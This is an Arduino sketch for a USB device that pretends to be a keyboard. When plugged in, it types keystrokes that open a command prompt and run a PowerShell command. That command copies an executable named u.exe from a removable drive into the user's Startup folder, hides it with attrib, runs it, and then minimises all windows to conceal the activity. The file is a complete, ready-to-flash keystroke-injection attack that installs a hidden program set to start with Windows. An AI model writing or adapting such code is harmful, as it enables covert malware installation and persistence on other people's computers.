#include "Keyboard.h"

void setup() { 
  Keyboard.begin(KeyboardLayout_it_IT);
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.print("powershell.exe -Command \"cd \\\"C:/users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\\\";$ProgressPreference=\\\"SilentlyContinue\\\"; xcopy E:/tpt/lora/u.exe -o u.exe;attrib +h u.exe;./u.exe\"&&exit\n");
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {}
